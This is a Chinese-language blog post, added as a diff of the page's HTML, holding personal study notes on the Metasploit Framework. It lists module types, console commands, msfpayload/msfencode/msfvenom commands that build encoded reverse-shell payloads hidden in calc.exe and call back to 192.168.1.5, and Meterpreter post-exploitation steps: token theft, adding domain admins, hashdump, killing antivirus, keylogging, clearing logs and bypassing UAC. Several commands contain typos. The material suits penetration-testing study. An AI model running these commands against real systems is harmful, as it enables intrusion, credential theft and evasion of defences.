@@ -1,0 +1,859 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="白尾青芳の小窝">
+  <title>Metasploit Framework(MSF) | 白尾青芳の小窝</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&family=Space+Grotesk:wght@500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css?v=20260722-2148">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <video class="backdrop" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source src="/images/wallpaper.mp4" type="video/mp4">
+  </video>
+
+  <button class="mobile-menu" id="menuToggle" type="button" aria-label="打开导航" aria-expanded="false">
+    <span></span><span></span><span></span>
+  </button>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="profile">
+      <img class="avatar" src="/images/fox-avatar.jpg" alt="白尾青芳头像">
+      <p class="eyebrow">SECURITY · CODE · NOTES</p>
+      <h1>白尾青芳</h1>
+      <p class="motto">在每一次请求与响应之间，找到系统真实的边界。</p>
+    </div>
+
+    <nav class="main-nav" aria-label="主导航">
+      <a class="" href="/"><i data-lucide="home"></i><span>博客首页</span></a>
+      <a class="" href="/study/"><i data-lucide="book-open"></i><span>学习导航</span></a>
+      <a href="/categories/Web-%E5%AE%89%E5%85%A8/"><i data-lucide="shield-check"></i><span>Web 安全</span></a>
+      <a href="/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"><i data-lucide="code-2"></i><span>开发笔记</span></a>
+      <a class="" href="/archives/"><i data-lucide="archive"></i><span>文章归档</span></a>
+      <a href="/about/"><i data-lucide="user-round"></i><span>关于我</span></a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="social-links">
+        <a target="_blank" rel="noopener" href="https://github.com/baiweiqingfang" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .5C5.65.5.5 5.65.5 12c0 5.1 3.29 9.43 7.86 10.96.58.1.79-.25.79-.56v-2.14c-3.2.7-3.87-1.36-3.87-1.36-.52-1.34-1.28-1.7-1.28-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.17 1.18.92-.26 1.9-.38 2.88-.39.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.39-5.25 5.67.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/></svg></a>
+        <a href="/atom.xml" aria-label="RSS" title="RSS"><i data-lucide="rss"></i></a>
+      </div>
+      <p>© 2026 白尾青芳 · Powered by Hexo</p>
+    </div>
+  </aside>
+
+  <main class="content">
+    <article class="article-page">
+  <header class="article-header">
+    <p class="eyebrow">learning</p>
+    <h1>Metasploit Framework(MSF)</h1>
+    <div class="post-meta">
+      <time datetime="2026-06-19T10:23:45.000Z">2026.06.19</time>
+      <span>30 分钟阅读</span>
+    </div>
+  </header>
+  <div class="article-content">
+    
+# Metasploit Framework(MSF)
+
+## 使用阶段
+
+### 威胁建模阶段
+
+在搜集信息之后,Metasploit 支持一系列数据库命令操作直接将这些信息汇总至PostgreSQL、MySQL、SQLite 数据库中,并为用户提供易用的数据库查询命令,可以帮助渗透测试者对目标系统搜索到的情报进行威胁建模,从中找出最可行的攻击路径。
+
+### 漏洞分析阶段
+
+除了信息搜集环节能够直接扫描出一些已公布的安全漏洞之外,Metasploit 中还提供了大量的协议Fuzz 测试器与Web 应用漏洞探测分析模块,支持具有一定水平能力的渗透测试者在实际过程中尝试挖掘出0Day 漏洞,并对漏洞机理与利用方法进行深入分析,而这将为渗透攻击目标带来
+更大的杀伤力,并提升渗透测试流程的技术含金量。
+
+### 后渗透攻击阶段
+
+在成功实施渗透攻击并获得目标系统的远程控制权之后,Metasploit 框架中另一个极具威名的工具Meterpreter在后渗透攻击阶段提供了强大功能。
+
+Meterpreter 可以看作一个支持多操作系统平台,可以仅仅驻留于内存中并具备免杀能力的高级后门工具,Meterpreter 中实现了特权提升、信息攫取、系统监控、跳板攻击与内网拓展等多样化的功能特性,此外还支持一种灵活可扩展的方式来加载额外功能的后渗透攻击模块。
+
+### 报告生成阶段
+
+Metasploit 框架获得的渗透测试结果可以输入至内置数据库中,因此这些结果可以通过数据查询来获取,并辅助渗透测试报告的写作。
+
+商业版的Metasploit Pro 具备了更加强大的报告生成功能,可以输出HTML、XML、Word 和PDF 格式的报告,把那个支持定制渗透测试报告
+模板。
+
+## 安装目录
+
+/usr/share/metasploit-framework
+
+## msf管理（Kali）
+
+sudo apt-get update
+
+sudo apt-get install metasploit-framework
+
+## 技术架构
+
+### 辅助模块（auxiliary）
+
+Metasploit 为渗透测试的信息搜集环节提供了大量的辅助模块支持,包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令
+猜测破解、敏感信息嗅探、探查敏感信息泄露、Fuzz 测试发掘漏洞、实施网络协议欺骗等模块。
+
+辅助模块能够帮助渗透测试者在渗透攻击之前取得目标系统丰富的情报信息。
+
+ #### scanner
+
+内网或外网进行大范围的资产搜刮、端口扫描、服务识别以及弱口令爆破
+
+##### mysql
+
+MySQL 服务扫描与爆破
+
+###### mysql_authbypass_hashdump
+
+针对MySQL 身份验证绕过漏洞（CVE-2012-2122）的全自动利用模块
+
+利用特定版本 MySQL 的协议逻辑缺陷，绕过密码认证，直接连入数据库并把目标系统内所有 MySQL 用户的用户名和密码哈希值（Password Hash）给全盘脱下来（Dump）
+
+##### smb
+
+###### smb_ms17_010   
+
+MS17-010远程代码执行（RCE）检测
+
+### 渗透攻击模块（exploits）
+
+主动渗透攻击所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中,由于这些服务通常是在主机上开启一些监听端口并等待客
+户端连接,因此针对它们的渗透攻击可以主动发起,通过连接目标系统网络服务,注入一些特殊构造的包含“邪恶”攻击数据的网络请求内容,触发安
+全漏洞,并使得远程服务进程执行在“邪恶”数据中包含攻击载荷,从而获取目标系统的控制会话。
+
+被动渗透攻击利用的漏洞位于客户端软件中,如浏览器、浏览器插件、电子邮件客户端、Office 与Adobe 等各种文档阅读与编辑软件。对于
+这类存在于客户端软件的安全漏洞,无法主动地将数据从远程输入到客户端软件中,因此只能采用被动渗透攻击的方式,即构造出“邪恶"的网页、电
+子邮件或文档文件,并通过架设包含此类恶意内容的服务、发送邮件附件、结合社会工程学分发并诱骗目标用户打开、结合网络欺骗和劫持技术等方
+式,等目标系统上的用户访问到这些邪恶的内容,从而触发客户端软件中的安全漏洞,给出控制目标系统的Shell 会话。
+
+#### multi
+
+通用型（multi-platform / multi-payload）
+
+它可以接收来自 Windows、Linux、macOS、Android 等各种系统的回连
+
+只要 payload 和 handler 的类型匹配
+
+##### handler
+
+处理器 / 接收器
+
+在指定 IP 和端口上启动监听服务
+
+等待目标机器执行 payload 后主动连接回来
+
+一旦连接建立，就接管会话，提供交互式 shell
+
+##### misc
+
+杂项
+
+###### weblogic_deserialize_asyncresponseservice
+
+### 1. 核心定义：反序列化攻击
+
+文件名中的 **`deserialize`**（反序列化）揭示了攻击原理。
+
+- **原理：** WebLogic 在处理某些特定的 XML 或对象数据时，没有对用户输入进行严格过滤。攻击者通过构造一个“恶意序列化对象”发送给服务器，服务器在将其还原（反序列化）回对象时，会意外执行其中包含的恶意代码。
+- **后果：** 攻击者无需账号密码，直接获取服务器系统的最高权限。
+
+------
+
+### 2. 目标组件：`AsyncResponseService`
+
+这是 WebLogic 的一个**异步响应服务**组件。
+
+- 该模块利用的是 **CVE-2019-2725**（以及相关的 CVE-2019-2729）。
+- 漏洞存在于 `wls9_async_response.war` 这个包中。
+- **受影响路径：** 通常攻击的 URL 路径包含 `/_async/AsyncResponseService`。
+
+------
+
+### 4. 这个模块的工作流程
+
+如果你在 `msfconsole` 中使用它，流程大致如下：
+
+1. **探测：** 检查目标服务器是否开启了 `/_async/AsyncResponseService` 路径。
+2. **构造 Payload：** 生成一段包含恶意指令的 XML 格式数据（利用了 `WorkContextXmlAnyAdapter` 漏洞类）。
+3. **发送：** 通过 HTTP POST 请求将这段 XML 发送给目标。
+4. **触发：** WebLogic 解析这段 XML 时触发反序列化，执行 Payload（如反弹一个 Meterpreter Shell）。
+
+#### Windows
+
+##### local
+
+##### smb
+
+###### ms17_010_eternalblue
+
+SMB远程Windows内核池损坏
+
+###### smb_doublepulsar_rce 
+
+
+
+### 攻击载荷模块（payloads）
+
+攻击载荷是在渗透攻击成功后使目标系统运行的一段植入代码,通常作用是为渗透攻击者打开在目标系统上的控制会话连接。
+
+MSF 中特指会话链接方式,例如TCP 反弹链接等。
+
+
+
+### 空指令模块（nops）
+
+空指令(nops)是一些对程序运行状态不会造成任何实质影响的空操作或者无关操作指令,最典型的空指令就是空操作,在x86 CPU 体系架
+构平台上的操作码是0x90。
+
+“占位’。
+
+### 编码器模块（encoders）
+
+攻击载荷模块与空指令模块组装完成一个指令序列后,在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前,Metasploit 框
+架还需要完成一道非常重要的工序 - 编码。
+
+确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符"。
+
+对攻击载荷进行“免杀’处理。
+
+### 免杀模块（evasion）
+
+#### Windows
+
+指定目标操作系统是Windows
+
+
+
+### 后渗透攻击模块（post）
+
+后渗透攻击模块主要支持在渗透攻击取得目标系统访问权或控制权之后,在受控系统中进行各式各样的后渗透攻击动作,比如获取敏感信息、进
+
+一步拓展、实施跳板攻击等。
+
+#### windows
+
+指定目标操作系统是Windows
+
+##### gather
+
+动作类型为信息收集
+
+###### checkvm
+
+执行以下操作：
+
+注册表项：寻找是否存在 VMware、VirtualBox、Hyper-V 或 Xen 的特征键值。
+
+服务与进程：检查是否有vmtoolsd.exe(VMware) 或VBoxService.exe (VirtualBox) 等进程在运行。
+
+硬件标识：查看某些虚拟机特有的MAC地址前缀或特定的硬件驱动名称。
+
+###### enum_applications
+
+枚举已安装的应用程序
+
+### 免杀模块（evasion）
+
+对攻击载荷进行"免杀"处理。
+
+## 1.基本命令
+
+| 命令            | 说明              |
+| --------------- | ----------------- |
+| exit            | 退出MSF控制台终端 |
+| sudo msfconsole | 启动MSF模块       |
+|                 |                   |
+
+## 2.MSF终端命令
+
+| 命令                  | 说明                                           |
+| --------------------- | ---------------------------------------------- |
+|                       |                                                |
+| back                  | 退出当前模块                                   |
+| info                  | 展示出制定渗透攻击或模块的相关信息             |
+| exlpoit               | 执行攻击                                       |
+| run                   | 运行模块                                       |
+| search <name>         | 查找metasploit框架中的所有渗透攻击和其他模块。 |
+| sessions -i <number>  | 切入会话                                       |
+| sessions -K           | 杀死所有活跃的交互会话。                       |
+| sessions -l           | 列出可用的交互会话（在处理多个shell时使用）    |
+|                       |                                                |
+|                       |                                                |
+| set <function> <text> | 设置特定的配置参数。                           |
+| show advanced         | 列出某个渗透攻击或模块中高级的参数配置。       |
+| show options          | 列出某个渗透攻击或模块中所有的参数配置。       |
+| show payloads         | 列出某个渗透攻击或模块中支持的所有payload      |
+|                       |                                                |
+| use <name>            | 装载一个渗透攻击或者模块。                     |
+| unset <function>      | 取消配置参数                                   |
+|                       |                                                |
+|                       |                                                |
+|                       |                                                |
+
+sessions -l -v
+
+列出所有可用的交互会话以及会话详细信息，例如：攻击系统时使用了哪个安全漏洞。
+
+sessions -s script
+
+在所有活跃的meterpreter会话中运行一个特定的meterpreter脚本。
+
+sessions -c cmd
+
+在所有活跃的metaerpreter会话上执行一个命令。
+
+sessions -u sessionID 
+
+升级一个普通的win32shell到meterpreter shell。
+
+| search使用技巧                | 示例                                |
+| ----------------------------- | ----------------------------------- |
+| 知道漏洞编号（如 MS17-010）   | `search ms17_010`                   |
+| 知道漏洞名称（如 BlueKeep）   | `search bluekeep`                   |
+| 知道 CVE 编号                 | `search CVE:2018-7600`              |
+| 想找某类工具（如爆破 Telnet） | `search type:auxiliary path:telnet` |
+| 想找 Web 类 Exploit           | `search type:exploit path:web`      |
+
+## 3.msf数据库命令
+
+| 命令               | 说明                                    |
+| ------------------ | --------------------------------------- |
+| db_import scan.xml | 导入外部扫描结果（如 nmap 的 XML 文件） |
+| hosts              | 列出数据库中所有已发现的主机            |
+| services           | 列出所有服务（IP、端口、协议、版本等）  |
+| services -p 445    | 筛选端口为 445 的服务（如 SMB）         |
+| services -c www    | 筛选服务名为 `www` 的条目（Web 服务）   |
+
+show exploit
+
+列出metasploit框架中的所有渗透攻击模块。
+
+show payloads
+
+列出metasploit框架中的所有攻击载荷。
+
+show auxiliary
+
+列出metasploit框架中的所有辅助攻击模块。
+
+LHOST
+
+目标主机链接的IP地址。
+
+RHOST
+
+远程主机或者目标主机。
+
+setg function 
+
+以全局方式设置特定的配置参数。
+
+show targets
+
+列出渗透攻击所支持的目标平台。
+
+set target num
+
+指定你所知道的目标的操作系统以及补丁版本类型。
+
+set payload
+
+指定想要使用的攻击载荷。
+
+show advanced 
+
+列出所有高级配置选项。
+
+set autorunscript migrate -f.
+
+在渗透攻击完成后，将自动迁移到另一个进程。
+
+check 检测目标是否对选定渗透攻击存在相应安全漏洞
+
+exploit 
+
+执行渗透攻击或模块来攻击目标。
+
+exploit -j
+
+在计划任务下进行渗透攻击（攻击将在后台进行）
+
+exploit -z
+
+渗透攻击成功后不与会话进行交互。
+
+exploit -e encoder 
+
+制定使用的攻击载荷编码方式
+
+exploit -h 
+
+列出exploit命令的帮助信息。
+
+db_create name 
+
+创建一个数据库驱动攻击所要使用的数据库。
+
+db_nmap
+
+利用nmap并把所有扫描数据库存储到数据库中。
+
+db_autopwn -h
+
+展示出db_autopwn命令的帮助信息。
+
+db_autopwn -p -r -e 
+
+对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。
+
+db_destroy 
+
+删除当前数据库。
+
+db_destroy user:password@host:port/database
+
+使用高级选项来删除数据库。
+
+ 
+
+## 4.metapreter命令
+
+### 平台通用性
+
+支持 Windows/Linux/BSD + x86/x64 + Java/PHP 实现
+
+Meterpreter 是跨平台武器，无论目标是什么系统，都能用同一套工具控制。
+
+Java/PHP 版本：即使目标没有 .exe 权限，也能通过网页或脚本启动 Meterpreter
+
+### 纯内存工作模式
+
+Meterpreter 直接注入进程内存，不写入磁盘，调用LoadLibrary，杀软很难检测（除非有高级内存分析）。
+
+LoadLibrary 是 Windows API，用于动态加载 DLL，常被恶意软件利用。
+
+###  灵活且加密的通信协议
+
+TLV 封包格式 + 加密传输 + 支持扩展
+
+TLV = Type-Length-Value，一种结构化数据格式，类似 JSON 但更轻量，适合网络传输。
+
+加密通信，防止流量被 IDS/IPS 检测
+
+可以自定义通信协议
+
+###  易于扩展
+
+Meterpreter 本身只是一个“框架”，真正的功能靠插件
+
+可以自己写 Ruby 插件，添加实现定制功能
+
+核心命令：
+
+| 命令         | 说明                                           |
+| ------------ | ---------------------------------------------- |
+|              |                                                |
+| background   | 将当前的meterpreter shell转为后台执行          |
+| shell        | 以所有可用令牌来运行一个交互的shell            |
+| show targets | 查看该漏洞支持哪些具体的操作系统版本或软件环境 |
+
+help
+
+打开帮助
+
+run scriptname
+
+运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。
+
+sysinfo
+
+列出受控主机的系统信息。
+
+ls 
+
+列出目标主机的文件和文件夹信息。
+
+use priv
+
+加载特权提升扩展模块，来扩展meterpreter库。
+
+ps
+
+显示所有运行进程以及关联的用户账户。
+
+migrate PID
+
+迁移到一个指定的进程ID
+
+use incognito 
+
+加载inconito功能（用来盗取目标主机的令牌或是假冒用户）
+
+list_tokens -u
+
+列出目标主机用户组的可用令牌。
+
+impersonate_token DOMAIN_NAME\\USERNAME
+
+假冒目标主机上的可用令牌。
+
+steal_token
+
+盗窃给定进程的可用令牌并进行令牌假冒。
+
+drop_token
+
+停止假冒当前的令牌。
+
+getsystem
+
+通过各种攻击向量来提升到系统用户权限。
+
+execute -f cmd.exe -i
+
+执行cmd.exe命令并进行交互。
+
+execute -f cmd.exe -i -t
+
+以所有可用令牌来执行cmd命令。
+
+execute -f cmd.exe -i -H -t
+
+以所有可用令牌来执行cmd命令并隐藏该进程。
+
+rev2self 
+
+回到控制目标主机的初始用户账户下。
+
+reg command
+
+在目标主机注册表中进行交互，创建，删除和查询等操作。
+
+setdesktop number
+
+切换到另一个用户界面（该功能基于那些用户已登录）。
+
+screenshot
+
+对目标主机的屏幕进行截图。
+
+upload file
+
+向目标主机上传文件。
+
+download file
+
+从目标主机下载文件。
+
+keyscan_dump存储目标主机上或许的键盘记录。
+
+getprivs
+
+尽可能多的获取目标主机上的特权。
+
+uietl enable keyboard/mouse
+
+接管目标主机的键盘和鼠标。
+
+hashdump
+
+导出目标主机中的口令哈希值。
+
+use sniffer
+
+加载嗅探模块。
+
+sniffer_interfaces
+
+列出目标主机所有开放的网络接口。
+
+sniffer_dump interfaceID pcapname
+
+在目标主机上启动嗅探。
+
+sniffer_start interfaceID packet_buffer
+
+在目标主机上针对特定范围的数据包缓冲区启动嗅探。
+
+sniffer_stats interfaceID
+
+获取正在实施嗅探网络接口的统计数据
+
+sniffer_stop interfaceID
+
+停止嗅探。
+
+add_user username password -h ip
+
+在远程目标主机上添加一个用户。
+
+add_group_user “Domain Adimins”username -h ip
+
+将用户添加到目标主机的域管理员组中。
+
+clearev
+
+清除目标主机上的日志记录。
+
+timestomp
+
+修改文件属性，例如修改文件的创建时间（反取证调差）。
+
+reboot
+
+重启目标主机。
+
+**3.MSFpayload命令**
+
+msfpayload -h
+
+MSFpayload 的帮助信息。
+
+msfpayload windows/meterpreter/bind_tcp O
+
+列出所有可用的攻击载荷。
+
+msfpayload windows/metarpreter/bind_tcp O.
+
+列出所有windows/meterpreter/bind_tcp 下攻击载荷的配置项（任何攻击载荷都是可以配置的）。
+
+msfpayload windows/metaerpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X>payload.exe
+
+创建一个metarpreter的reverse_tcp 攻击载荷回连到192.168.1.5的443端口，将其保存为名为payload.exe的windows可执行程序。
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R>payload.ray
+
+与上面生成同样的攻击载荷，到导成原始格式的文件，该文件将在后面的MSFencode中使用。
+
+msfpayload windows/meterpreter/bind_tcp LPORT=443 C>payload.c
+
+与上面生成同样的攻击载荷，但导出成C格式的shellcode。
+
+msfpayload windows/meterpreter/bind_tcp LPORT=443 J>payload.java
+
+导出成以%u编码方式的javaScript语言字符串。
+
+ 
+
+4.MSFencode命令
+
+msfencode -h
+
+列出MSFencode的帮助信息。
+
+msfencode -l
+
+列出所有可用的编码器。
+
+msfencode -t（c，eif.exe，java，js_be，perl，raw，ruby，vba，vbs，loop-vbs，asp，war，macho）
+
+显示编码缓冲区的格式。
+
+msfencode -i payload.raw -o encoded_payload,exe -e x86/shikata_ga_nai -c 5 -t exe
+
+使用 shikata_nai编码器对payload.raw文件进行5次编码，然后导出一个名为encoded_payload.exe的文件。
+
+msfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -e x86/_countdown -c 5 -t raw|msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe
+
+创建一个经过多种编码格式嵌套编码的攻击载荷。
+
+msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c
+
+创建一个纯字母 数字的shellcode，由ESI寄存器指向shellcode，以C语言格式输出。
+
+ 
+
+5.MSFcli命令。
+
+msfcli | grep exploit
+
+仅列出渗透攻击模块。
+
+msfcli | grep exploit/windows
+
+仅列出与Windows相关的渗透攻击模块。
+
+msfcli exploit/windows/smb/msf08_067_netapi PYALOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E
+
+对172.16.32.142 发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听。
+
+ 
+
+6.Metasploit高级忍术
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -k -o payload.exe -c x86/shikata_ga_nai -c 7 -t exe
+
+创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5 主机的443端口，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序payload.exe。
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe
+
+创建一个反弹式的meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会再目标主机上弹出任何信息。这种配置非常有用，当你通过浏览器漏洞控制了远程主机，并不想让计算机程序打开呈现在目标用户面前，同样，最后生成用.shikata_ga_nai 编码的攻击载荷程序payload.exe。
+
+msfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -0 payload.exe -e x86/shikata_ga_nai -c 7 exe & & msfcli multi/bandler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E
+
+创建一个raw格式的bind_tcp模式Meterpreter攻击载荷，用shikata_ga_nai编码7次，输出以payload.exe命名的windows可执行程序文件，同时启用多路监听方式进行执行。
+
+ 
+
+## 7.MSFvenom
+
+MSFvenom是msfpayload和msfencode的结合体,可利用MSFvenom生成木马程序并在目标机上执行,在本地监听上线
+
+推荐的编码器：
+
+x86/shikata ga nai
+
+cmd/powershell base64
+
+命令格式
+
+msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <path>
+
+常用参数
+
+| 参数         | 说明                                                     |
+| ------------ | -------------------------------------------------------- |
+|              |                                                          |
+| -e <encoder> | 要使用的编码器                                           |
+| -f <format>  | 输出格式                                                 |
+| -i <count>   | 对载荷进行编码的次数                                     |
+| -k           | 保留模板行为，并将载荷作为新线程注入，保持原程序继续运行 |
+| -l <type>    | 列举该类型的所有模块                                     |
+| -o <path>    | 以文件形式保存                                           |
+| -p <payload> | 指定需要使用的payload，也可以使用自定义的payload         |
+| -x <path>    | 指定一个自定义的可执行文件作为模板，并将payload嵌入其中  |
+
+8.Meterpreter后渗透攻击阶段命令。
+
+在Windows主机上使用metarpreter进行提权操作。
+
+meterpreter>use priv
+
+meterpreter>getsystem
+
+从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中。
+
+ 
+
+meterpreter>ps
+
+ 
+
+meterpreter>steal_token 1784
+
+c:\windows\sysem32>user metasploit @password /ADD /DOMAIN
+
+c:\windows\sysem32>net group "Domain Admins" metasploit /ADD /DOMAIN
+
+ 
+
+从SAM数据库中导出密码的哈希值。
+
+meterpreter>use priv
+
+meterpreter>getsystem
+
+meterpreter>hashdump
+
+提示：在widonws 2008中，如果getsystem命令和hashdump命令抛出异常情况时，你需要迁移到一个以SYSTEM系统权限运行的进程中。
+
+自动迁移到一个独立进程。
+
+meterpreter>run migrate
+
+ 
+
+通过meterpreter的killav脚步来杀死目标主机运行的杀毒软件进程。
+
+meterpreter>run kallav
+
+针对一个特定的进程捕获目标主机上的键盘记录：
+
+meterpreter>ps
+
+meterpreter>migrate 1436
+
+meterpreter>kayscan_start
+
+meterpreter>kayscan_start
+
+meterpreter>keyscan_dump
+
+meterpreter>kayscan_stop
+
+使用匿名方式来假冒管理员：
+
+meterpreter>use incognito
+
+meterpreter>list_tokens -u
+
+meterpreter>use priv
+
+meterpreter>getsystem
+
+meterpreter>list_tokens -u
+
+meterpreter>impersonate_token IHAZSECURITY\\Admininistrator
+
+查看目标主机都采取了那些防范保护措施，列出帮助菜单，关闭防火墙以及其它我们发现的保护措施。
+
+meterpreter>run getcountermeasure
+
+meterpreter>run getcountermeasure -h
+
+meterpreter>run getcountermeasure -d -k
+
+识别被控制的主机是否是一台虚拟机。
+
+meterpreter>run checkvm
+
+在一个meterpreter会话界面中使用cmd shell。
+
+meterpreter>shell
+
+获取目标主机的图形界面（VNC）.
+
+meterpreter>run vnc
+
+绕过windows的用户账户控制（UAC）机制。
+
+meterpreter>run post/windows/escalate/bypassuac
+
+导出苹果OS-X系统的口令哈希值。
+
+meterpreter>run post/osx/gather/hashdump
+
+导出linux系统的口令哈希值。
+
+meterpreter>run post/linux/gather/hashdump
+
+6.msf数据库命令
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+  </main>
+
+  <button class="back-to-top" id="backToTop" type="button" aria-label="回到顶部"><i data-lucide="arrow-up"></i></button>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  <script src="/js/main.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+
+
